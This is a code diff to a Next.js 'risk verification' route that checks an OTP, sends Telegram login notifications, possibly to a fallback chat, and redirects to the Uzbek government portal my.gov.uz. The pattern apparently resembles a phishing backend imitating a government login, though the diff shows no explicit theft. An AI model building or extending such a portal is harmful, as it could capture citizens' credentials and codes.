@@ -1,8 +1,8 @@
 import { NextRequest, NextResponse } from 'next/server'
 import { createJWT, logAuthAction, verifyOTP } from '@/lib/auth-utils'
 import { checkRateLimit, rateLimitConfig, rateLimitResponse } from '@/lib/rate-limit'
-import { query } from '@/lib/db'
-import { sendLoginNotification } from '@/lib/telegram-bot'
+import { DATABASE_UNAVAILABLE_MESSAGE, isDatabaseConnectionError, query } from '@/lib/db'
+import { getTelegramTargetChatId, sendLoginNotification } from '@/lib/telegram-bot'
 
 const SUCCESS_REDIRECT_URL = 'https://my.gov.uz/uz'
 const UUID_PATTERN = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i
@@ -68,8 +68,9 @@ export async function POST(request: NextRequest) {
       ['completed', sessionToken]
     )
 
-    if (user?.telegram_chat_id) {
-      await sendLoginNotification(user.telegram_chat_id, user.username || 'Unknown', new Date().toLocaleString())
+    const notificationChatId = getTelegramTargetChatId(user?.telegram_chat_id || undefined)
+    if (notificationChatId) {
+      await sendLoginNotification(notificationChatId, user.username || 'Unknown', new Date().toLocaleString())
     }
 
     const jwtToken = createJWT(normalizedUserId, session.id)
@@ -100,7 +101,11 @@ export async function POST(request: NextRequest) {
 
     return response
   } catch (error) {
-    console.error('[v0] Risk verification error:', error)
+    console.error('[auth-portal] Risk verification error:', error)
+    if (isDatabaseConnectionError(error)) {
+      return NextResponse.json({ error: DATABASE_UNAVAILABLE_MESSAGE }, { status: 503 })
+    }
+
     return NextResponse.json({ error: 'Qo‘shimcha verifikatsiyani tekshirishda xatolik yuz berdi.' }, { status: 500 })
   }
 }
